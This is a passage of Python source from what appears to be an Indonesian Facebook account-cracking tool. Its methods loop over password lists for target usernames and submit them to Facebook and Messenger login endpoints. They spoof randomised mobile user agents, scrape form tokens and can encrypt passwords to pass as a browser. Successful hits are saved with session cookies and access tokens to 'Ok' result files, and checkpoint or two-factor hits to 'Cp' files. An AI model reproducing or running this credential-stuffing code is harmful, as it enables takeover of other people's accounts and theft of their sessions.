                    self.density = random.choice(['density=2.0, width=720, height=702, scaledDensity=2.0, xdpi=281.353, ydpi=283.028', 'density=2.0, width=720, height=1280, scaledDensity=2.0, xdpi=281.353, ydpi=282.713', 'density=2.0, width=720, height=1369, scaledDensity=2.0, xdpi=281.353, ydpi=279.768', 'density=1.75, width=720, height=1382, scaledDensity=1.75, xdpi=268.941, ydpi=269.986', 'density=2.0, width=720, height=1440, scaledDensity=2.0, xdpi=281.353, ydpi=281.353'])
                    self.useragent = f'{self.useragent_android} [FBAN/EMA;FBLC/id_ID;FBAV/'+ str(self.app_version) +';FBDM/DisplayMetrics{'+ str(self.density) +'};]'
                    with requests.Session() as r:
                        r.headers.update({
                            'Sec-Fetch-Site': 'same-origin',
                            'Cache-Control': 'max-age=0',
                            'X-Requested-With': 'mark.via.gp',
                            'Sec-Fetch-Mode': 'navigate',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Connection': 'keep-alive',
                            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Sec-Fetch-Dest': 'document',
                            'Host': 'm.prod.facebook.com',
                            'Accept-Encoding': 'gzip, deflate',
                            'Sec-Fetch-User': '?1',
                            'User-Agent': self.useragent,
                            'Upgrade-Insecure-Requests': '1',
                        })
                        response = r.get('https://m.prod.facebook.com/login/device-based/password/?uid={}&flow=login_no_pin&refsrc=deprecated&_rdr'.format(username)).text
                        try:
                            self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                            self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                            if bool(encrypt_password) == True:
                                self.pubKeyData = re.search('{publicKey:"(.*?)",keyId:(\d+)}', str(response))
                                self.publicKey, self.keyId = self.pubKeyData.group(1), self.pubKeyData.group(2)
                                self.enc_password = self.Encrypt_Password_Browser(int(self.keyId), self.publicKey, pws)
                            else:
                                self.enc_password = (f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pws}')
                        except (AttributeError):
                            print("\r                                                        ", end='\r')
                            print("[bold dodger_blue3]   ───>[bold red] ATTRIBUTEERROR!", end='\r')
                            time.sleep(1.5)
                            continue
                        data = {
                            'jazoest': self.jazoest,
                            'encpass': self.enc_password,
                            'lsd': self.lsd,
                            'flow': 'login_no_pin',
                            'uid': username,
                            'next': 'https://m.prod.facebook.com/login/save-device/',
                        }
                        r.headers.update({
                            'Referer': 'https://m.prod.facebook.com/login/device-based/password/?uid={}&flow=login_no_pin&refsrc=deprecated&_rdr'.format(username),
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                            'Origin': 'https://m.prod.facebook.com',
                            'Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                        })
                        response2 = r.post('https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0', data = data, allow_redirects = True)
                        #open('Response.txt', 'a+').write(f'{username}|{pws}|{self.enc_password}|{self.useragent}|{r.cookies.get_dict()}\n')
                        if 'c_user' in r.cookies.get_dict():
                            self.cookies = ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold green]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold green]{self.cookies}", style = "bold dodger_blue3", width = 61))
                            if '#PWD_BROWSER:5:' in str(self.enc_password):
                                tree.add(Panel(f"[bold green]{self.enc_password}", style = "bold dodger_blue3", width = 61))
                            else:
                                tree.add(Panel(f"[bold green]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Sukses.append(f'{username}|{pws}|{self.cookies}|{self.useragent}')
                            with open(f'Results/Ok-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.cookies}|{self.useragent}\n')
                            w.close()
                            break
                        elif 'checkpoint' in r.cookies.get_dict():
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{pws}", style = "bold dodger_blue3", width = 30)]))
                            if '#PWD_BROWSER:5:' in str(self.enc_password):
                                tree.add(Panel(f"[bold red]{self.enc_password}", style = "bold dodger_blue3", width = 61))
                                tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            else:
                                tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{pws}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.useragent}\n')
                            w.close()
                            break
                        else:
                            continue
            Looping += 1
            print(f"[bold dodger_blue3]   ───>[bold white] Crack[bold green] {str(username)[:15]}[bold white]/[bold blue]{Looping}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{str(self.persen)[:4]}%[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white] Ok:-[bold green]{len(Sukses)}     ", end='\r');time.sleep(0.0007)
        except (RequestException) as e:
            print("\r                                                        ", end='\r')
            print("[bold dodger_blue3]   ───>[bold red] KONEKSI ERROR!", end='\r')
            time.sleep(10.5)
            self.Mobile(total, username, password, encrypt_password)
        except (Exception) as e:
            print("\r                                                        ", end='\r')
            print(f"[bold dodger_blue3]   ───>[bold red] {str(e).upper()}!", end='\r')

    def Messenger_Lite(self, total, username, password, your_provider):
        global Sukses, Checkpoint, Looping
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    self.useragent, self.persen = (str(Generate().Messenger_Lite_Useragent()).replace('INDOSAT', your_provider)), (Looping * 100 / len(total))
                    with requests.Session() as r:
                        self.device_id = str(uuid.uuid4())
                        r.headers.clear()
                        r.headers.update({
                            'authorization': 'OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',
                            #'transfer-encoding': 'chunked',
                            'accept-encoding': 'gzip',
                            'content-type': 'application/x-www-form-urlencoded',
                            #'content-encoding': 'gzip',
                            'Host': 'b-graph.facebook.com',
                            'connection': 'Keep-Alive',
                            'user-agent': self.useragent,
                        })
                        data = {
                            'error_detail_type': 'button_with_disabled',
                            'email': username,
                            'credentials_type': 'password',
                            'format': 'json',
                            'generate_analytics_claim': '1',
                            'method': 'POST',
                            'device_id': self.device_id,
                            'password': pws,
                            'generate_machine_id': '1',
                            'generate_session_cookies': '1',
                        }
                        response2 = r.post('https://b-graph.facebook.com/auth/login', data = data, allow_redirects = True)
                        #open('Response.txt', 'a+').write(f'{username}|{pws}|{self.useragent}|{str(response2.text}\n')
                        if '"access_token":"EAAC' in str(response2.text.replace('\\', '')) or '"session_key":"' in str(response2.text.replace('\\', '')):
                            try:
                                self.access_token = json.loads(response2.text)['access_token']
                                self.cookies = ("; ".join(z["name"] + "=" + z["value"] for z in json.loads(response2.text)["session_cookies"]))
                            except:
                                break
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold green]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold green]{self.access_token}", style = "bold dodger_blue3", width = 61))
                            tree.add(Panel(f"[bold green]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Sukses.append(f'{username}|{pws}|{self.cookies}|{self.useragent}')
                            with open(f'Results/Ok-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.cookies}|{self.useragent}\n')
                            w.close()
                            break
                        elif 'https://www.facebook.com/checkpoint/' in str(response2.text.replace('\\', '')) or 'User must verify their account on' in str(response2.text):
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{pws}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.useragent}\n')
                            w.close()
                            break
                        elif 'https://m.facebook.com/two_factor/' in str(str(response2.text.replace('\\', ''))) or 'Login approvals are on.' in str(response2.text):
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]TWO FACTOR AUTHENTICATION", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{pws}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.useragent}\n')
                            w.close()
                            break
                        else:
                            continue
            Looping += 1
            print(f"[bold dodger_blue3]   ───>[bold white] Crack[bold green] {str(username)[:15]}[bold white]/[bold blue]{Looping}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{str(self.persen)[:4]}%[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white] Ok:-[bold green]{len(Sukses)}     ", end='\r')
            time.sleep(0.0007)
        except (RequestException) as e:
            print("\r                                                        ", end='\r')
            print("[bold dodger_blue3]   ───>[bold red] KONEKSI ERROR!", end='\r')
            time.sleep(10.5)
            self.Messenger_Lite(total, username, password, your_provider)
        except (Exception) as e:
            print("\r                                                        ", end='\r')
            print(f"[bold dodger_blue3]   ───>[bold red] {str(e).upper()}!", end='\r')

    def Messenger(self, total, username, password):
        global Sukses, Checkpoint, Looping
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    Useragent.update({
                        "Device": "Windows"
                    })
                    self.useragent, self.persen = (Generate().Android_Useragent()), (Looping * 100 / len(total))
                    with requests.Session() as r:
                        r.headers.update({
                            'upgrade-insecure-requests': '1',
                            'Host': 'www.messenger.com',
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'sec-fetch-site': 'none',
                            'accept-encoding': 'gzip, deflate',
                            'user-agent': self.useragent,
                            'sec-fetch-dest': 'document',
                            'sec-fetch-mode': 'navigate',
                            'accept-language': 'en-US,en;q=0.9',
                            'sec-fetch-user': '?1',
                            'connection': 'keep-alive',
                        })
                        response = r.get('https://www.messenger.com/login/?'.format(username)).text
                        try:
                            self._js_datr = re.search('"_js_datr","(.*?)",', str(response)).group(1)
                            self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                            self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                            self.initial_request_id = re.search('name="initial_request_id" value="(.*?)"', str(response)).group(1)
                            self.lgnrnd = re.search('name="lgnrnd" value="(.*?)"', str(response)).group(1)
                        except (AttributeError):
                            print("\r                                                        ", end='\r')
                            print("[bold dodger_blue3]   ───>[bold red] ATTRIBUTEERROR!", end='\r')
                            time.sleep(1.5)
                            continue
                        data = {
                            'lgndim': 'eyJ3IjoxMjgwLCJoIjo3MjAsImF3IjoxMjgwLCJhaCI6NjcyLCJjIjoyNH0=',
                            'persistent': '1',
                            'initial_request_id': self.initial_request_id,
                            'default_persistent': '',
                            'email': username,
                            'lgnrnd': self.lgnrnd,
                            'lgnjs': 'n',
                            'lsd': self.lsd,
                            'login': '1',
                            'jazoest': self.jazoest,
                            'pass': pws,
                            'timezone': '-420',
                        }
                        r.headers.update({
                            'referer': 'https://www.messenger.com/login/?',
                            'cookie': '_js_datr={}; wd=1280x595; dpr=1.5'.format(self._js_datr),
                            'cache-control': 'max-age=0',
                            'content-type': 'application/x-www-form-urlencoded',
                            'sec-fetch-site': 'same-origin',
                            'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                            'origin': 'https://www.messenger.com',
                        })
                        response2 = r.post('https://www.messenger.com/login/password/', data = data, allow_redirects = True)
                        #open('Response.txt', 'a+').write(f'{username}|{pws}|{self.useragent}|{str(r.cookies.get_dict())}\n')
                        if 'c_user' in r.cookies.get_dict():
                            self.cookies = ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold green]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold green]{self.cookies}", style = "bold dodger_blue3", width = 61))
                            tree.add(Panel(f"[bold green]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Sukses.append(f'{username}|{pws}|{self.cookies}|{self.useragent}')
                            with open(f'Results/Ok-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.cookies}|{self.useragent}\n')
                            w.close()
                            break
                        elif 'checkpoint_interstitial' in str(response2.url):
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{pws}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.useragent}\n')
                            w.close()
                            break
                        else:
                            continue
            Looping += 1
            print(f"[bold dodger_blue3]   ───>[bold white] Crack[bold green] {str(username)[:15]}[bold white]/[bold blue]{Looping}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{str(self.persen)[:4]}%[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white] Ok:-[bold green]{len(Sukses)}     ", end='\r');time.sleep(0.0007)
        except (RequestException) as e:
            print("\r                                                        ", end='\r')
            print("[bold dodger_blue3]   ───>[bold red] KONEKSI ERROR!", end='\r')
            time.sleep(10.5)
            self.Messenger(total, username, password)
        except (Exception) as e:
            print("\r                                                        ", end='\r')
            print(f"[bold dodger_blue3]   ───>[bold red] {str(e).upper()}!", end='\r')

    def Default(self, total, username, password, type_useragent):
        global Sukses, Checkpoint, Looping
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    if str(type_useragent).capitalize() == "Lite":
                        self.useragent_android, self.persen = (Generate().Android_Useragent()), (Looping * 100 / len(total))
                        self.app_version = random.choice(['369.0.0.5.110', '371.0.0.0.78', '371.0.0.0.33', '370.0.0.12.116', '370.0.0.0.39', '369.0.0.2.110', '369.0.0.0.84', '369.0.0.0.21', '369.0.0.0.4', '368.0.0.5.95', '368.0.0.4.95', '368.0.0.2.95', '368.0.0.0.84', '368.0.0.0.69', '368.0.0.0.15', '368.0.0.0.3', '367.0.0.7.52', '367.0.0.6.52', '367.0.0.5.52', '367.0.0.0.44', '367.0.0.0.14', '367.0.0.0.3', '366.0.0.10.51', '366.0.0.6.51', '366.0.0.3.51', '366.0.0.0.3', '365.0.0.9.53', '365.0.0.8.53', '365.0.0.4.53', '365.0.0.0.44', '364.0.0.14.77', '364.0.0.11.77', '365.0.0.0.13', '364.0.0.9.77', '365.0.0.0.4', '364.0.0.0.58', '363.0.0.6.63', '363.0.0.5.63', '363.0.0.4.63', '364.0.0.0.16', '364.0.0.0.3', '363.0.0.2.63', '363.0.0.0.60', '363.0.0.0.49', '362.0.0.10.67', '362.0.0.7.67', '363.0.0.0.14', '362.0.0.6.67', '362.0.0.3.67', '363.0.0.0.3', '362.0.0.0.62', '362.0.0.0.49', '361.0.0.12.5', '361.0.0.11.5', '361.0.0.10.5', '361.0.0.9.5', '362.0.0.0.11', '361.0.0.8.5', '361.0.0.6.5', '362.0.0.0.3', '362.0.0.0.46', '362.0.0.0.39', '360.0.0.7.53', '362.0.0.0.27', '362.0.0.0.18', '360.0.0.6.53', '360.0.0.5.53', '360.0.0.4.53', '359.0.0.11.81', '359.0.0.10.81', '359.0.0.5.81', '358.0.0.8.62', '358.0.0.6.62', '358.0.0.3.62', '357.0.0.12.72', '357.0.0.10.72', '357.0.0.9.72', '357.0.0.3.72', '356.0.0.7.89', '356.0.0.6.89', '356.0.0.4.89', '356.0.0.2.89', '355.0.0.6.103', '355.0.0.5.103', '355.0.0.4.103', '355.0.0.3.103', '355.0.0.2.103', '354.0.0.8.108', '354.0.0.7.108', '354.0.0.5.108', '354.0.0.2.108', '353.0.0.5.112', '353.0.0.4.112', '353.0.0.3.112', '353.0.0.1.112', '352.0.0.14.108', '352.0.0.8.108', '352.0.0.5.108', '351.0.0.6.115', '351.0.0.5.115', '351.0.0.2.115', '350.0.0.5.116', '350.0.0.4.116', '350.0.0.3.116', '350.0.0.0.21', '350.0.0.0.6', '349.0.0.8.103', '349.0.0.6.103', '349.0.0.5.103', '349.0.0.3.103', '349.0.0.0.93', '349.0.0.0.76', '348.0.0.8.103', '348.0.0.7.103', '349.0.0.0.36', '349.0.0.0.20', '348.0.0.4.103', '349.0.0.0.6', '348.0.0.0.92', '348.0.0.0.78', '347.0.0.17.97', '348.0.0.0.37', '347.0.0.14.97', '348.0.0.0.4', '347.0.0.0.91', '347.0.0.0.78', '346.0.0.8.76', '346.0.0.6.76', '347.0.0.0.22', '346.0.0.5.76', '347.0.0.0.5', '346.0.0.3.76', '346.0.0.0.69', '346.0.0.0.59', '345.0.0.8.69', '345.0.0.6.69', '346.0.0.0.21', '346.0.0.0.16', '345.0.0.3.69', '346.0.0.0.5', '345.0.0.2.69', '345.0.0.0.64', '345.0.0.0.54', '344.0.0.10.83', '345.0.0.0.23', '344.0.0.9.83', '345.0.0.0.13', '344.0.0.6.83', '345.0.0.0.4', '344.0.0.3.83', '344.0.0.0.74', '344.0.0.0.64', '343.0.0.13.79', '344.0.0.0.30', '344.0.0.0.14', '344.0.0.0.5', '343.0.0.11.79', '343.0.0.8.79', '343.0.0.4.79', '343.0.0.0.72', '343.0.0.0.59', '342.0.0.11.89', '342.0.0.8.89', '343.0.0.0.24', '342.0.0.6.89', '343.0.0.0.13', '342.0.0.4.89', '343.0.0.0.3', '342.0.0.0.79', '342.0.0.0.66', '341.0.0.7.68', '342.0.0.0.17', '341.0.0.6.68', '341.0.0.4.68', '342.0.0.0.1', '341.0.0.2.68', '341.0.0.0.63', '341.0.0.0.54', '341.0.0.0.23', '341.0.0.0.16', '341.0.0.0.5', '340.0.0.9.76', '340.0.0.8.76', '340.0.0.5.76', '340.0.0.2.76', '340.0.0.0.72', '340.0.0.0.61', '339.0.0.10.100', '340.0.0.0.28', '339.0.0.8.100', '339.0.0.6.100', '340.0.0.0.18', '340.0.0.0.5', '339.0.0.2.100', '339.0.0.0.92', '339.0.0.0.78', '338.0.0.10.102', '338.0.0.9.102', '339.0.0.0.37', '339.0.0.0.21', '338.0.0.6.102', '338.0.0.5.102', '337.0.0.7.102', '338.0.0.0.34', '338.0.0.0.19', '338.0.0.0.5', '337.0.0.2.102', '337.0.0.0.94', '337.0.0.0.78', '336.0.0.11.99'])
                        self.density = random.choice(['density=2.0, width=720, height=702, scaledDensity=2.0, xdpi=281.353, ydpi=283.028', 'density=2.0, width=720, height=1280, scaledDensity=2.0, xdpi=281.353, ydpi=282.713', 'density=2.0, width=720, height=1369, scaledDensity=2.0, xdpi=281.353, ydpi=279.768', 'density=1.75, width=720, height=1382, scaledDensity=1.75, xdpi=268.941, ydpi=269.986', 'density=2.0, width=720, height=1440, scaledDensity=2.0, xdpi=281.353, ydpi=281.353'])
                        self.useragent = f'{self.useragent_android} [FBAN/EMA;FBLC/id_ID;FBAV/'+ str(self.app_version) +';FBDM/DisplayMetrics{'+ str(self.density) +'};]'
                    else:
                        self.useragent, self.persen = (Generate().Android_Useragent()), (Looping * 100 / len(total))
                    with requests.Session() as r:
                        r.headers.update({
                            'Host': 'd.prod.facebook.com',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': '1',
                            'User-Agent': self.useragent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Sec-Fetch-Site': 'same-origin',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-User': '?1',
                            'X-Requested-With': 'com.facebook.lite',
                            'Sec-Fetch-Dest': 'document',
                        })
                        response = r.get('https://d.prod.facebook.com/login.php?').text
                        try:
                            self.ajaxURI = re.search('method="post" action="(.*?)"', str(response)).group(1).replace('amp;', '')
                            self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                            self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                            self.m_ts = re.search('name="m_ts" value="(\d+)"', str(response)).group(1)
                            self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
                            self.bi_xrwh = re.search('name="bi_xrwh" value="(.*?)"', str(response)).group(1)
                        except (AttributeError):
                            print("\r                                                        ", end='\r')
                            print("[bold dodger_blue3]   ───>[bold red] ATTRIBUTEERROR!", end='\r')
                            time.sleep(1.5)
                            continue
                        data = {
                            'bi_xrwh': self.bi_xrwh,
                            'lsd': self.lsd,
                            'jazoest': self.jazoest,
                            'm_ts': self.m_ts,
                            'login': 'Log In',
                            'pass': pws,
                            'email': username,
                            'try_number': 0,
                            'unrecognized_tries': 0,
                        }
                        r.headers.update({
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Referer': 'https://d.prod.facebook.com/',
                            'dpr': '1.5',
                            'Cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                            'Origin': 'https://d.prod.facebook.com',
                            'Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                        })
                        response2 = r.post('https://d.prod.facebook.com{}'.format(self.ajaxURI), data = data, allow_redirects = True)
                        #open('Response.txt', 'a+').write(f'{username}|{pws}|{self.useragent}|{str(r.cookies.get_dict())}\n')
                        if 'c_user' in r.cookies.get_dict():
                            self.cookies = ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold green]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold green]{self.cookies}", style = "bold dodger_blue3", width = 61))
                            tree.add(Panel(f"[bold green]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Sukses.append(f'{username}|{pws}|{self.cookies}|{self.useragent}')
                            with open(f'Results/Ok-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.cookies}|{self.useragent}\n')
                            w.close()
                            break
                        elif 'checkpoint' in r.cookies.get_dict():
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{pws}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.useragent}\n')
                            w.close()
                            break
                        else:
                            continue
            Looping += 1
            print(f"[bold dodger_blue3]   ───>[bold white] Crack[bold green] {str(username)[:15]}[bold white]/[bold blue]{Looping}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{str(self.persen)[:4]}%[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white] Ok:-[bold green]{len(Sukses)}     ", end='\r');time.sleep(0.0007)
        except (RequestException) as e:
            print("\r                                                        ", end='\r')
            print("[bold dodger_blue3]   ───>[bold red] KONEKSI ERROR!", end='\r')
            time.sleep(10.5)
            self.Default(total, username, password, type_useragent)
        except (Exception) as e:
            print("\r                                                        ", end='\r')
            print(f"[bold dodger_blue3]   ───>[bold red] {str(e).upper()}!", end='\r')

    def Web_Regular(self, total, username, password, encrypt_password):
        global Sukses, Checkpoint, Looping
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    Useragent.update({
                        "Device": "Windows"
                    })
                    self.useragent, self.persen = (Generate().Android_Useragent()), (Looping * 100 / len(total))
                    with requests.Session() as r:
                        r.headers.update({
                            'Upgrade-Insecure-Requests': '1',
                            'Accept-Encoding': 'gzip, deflate',
                            'Sec-Fetch-User': '?1',
                            'Accept-Language': 'id,en;q=0.9',
                            'Host': 'web.prod.facebook.com',
                            'Sec-Fetch-Dest': 'document',
                            'User-Agent': self.useragent,
                            'Sec-Fetch-Site': 'none',
                            'Connection': 'keep-alive',
                            'Sec-Fetch-Mode': 'navigate',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        })
                        response = r.get('https://web.prod.facebook.com/pages/create/?ref_type=registration_form').text
                        try:
                            self.ajaxURI = re.search('id="login_form" action="(.*?)" method="post"', str(response)).group(1).replace('amp;', '')
                            self._js_datr = re.search('"_js_datr","(.*?)"', str(response)).group(1)
                            self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                            self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                            self.lgnrnd = re.search('name="lgnrnd" value="(.*?)"', str(response)).group(1)
                            self.pubKey = re.search('{"pubKey":{"publicKey":"(.*?)","keyId":(\d+)}}', str(response))
                            self.publicKey, self.keyId = self.pubKey.group(1), self.pubKey.group(2)
                        except (AttributeError):
                            print("\r                                                        ", end='\r')
                            print("[bold dodger_blue3]   ───>[bold red] ATTRIBUTEERROR!", end='\r')
                            time.sleep(1.5)
                            continue
                        if bool(encrypt_password) == True:
                            self.enc_password = self.Encrypt_Password_Browser(int(self.keyId), self.publicKey, pws)
                        else:
                            self.enc_password = (f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pws}')
                        data = {
                            'prefill_source': 'browser_dropdown',
                            'lgnrnd': self.lgnrnd,
                            'ab_test_data': 'AAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAA//AAAAAAAABAAB',
                            'jazoest': self.jazoest,
                            'prefill_contact_point': username,
                            'lsd': self.lsd,
                            'prefill_type': 'password',
                            'email': username,
                            'timezone': '-420',
                            'lgndim': 'eyJ3IjoxMjgwLCJoIjo3MjAsImF3IjoxMjgwLCJhaCI6NjcyLCJjIjoyNH0=',
                            'lgnjs': str(int(time.time())),
                            'locale': 'id_ID',
                            'login_source': 'login_bluebar',
                            'guid': str(uuid.uuid4()).replace('-', '')[:14],
                            'encpass': self.enc_password,
                        }
                        r.headers.update({
                            'Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Cache-Control': 'max-age=0',
                            'dpr': '1.5',
                            'Cookie': f'{("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))}; wd=1280x601; datr={self._js_datr}; dpr=1.5',
                            'Origin': 'https://web.prod.facebook.com',
                            'Referer': 'https://web.prod.facebook.com/pages/create/?ref_type=registration_form',
                            'Sec-Fetch-Site': 'same-origin',
                        })
                        response2 = r.post(self.ajaxURI, data = data, allow_redirects = True)
                        #open('Response.txt', 'a+').write(f'{username}|{pws}|{self.useragent}|{r.cookies.get_dict()}\n')
                        if 'https://web.facebook.com/checkpoint/' in str(response2.url) and 'c_user' in r.cookies.get_dict():
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]PERLU PERSETUJUAN LOGIN", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{pws}", style = "bold dodger_blue3", width = 30)]))
                            if '#PWD_BROWSER:5:' in str(self.enc_password):
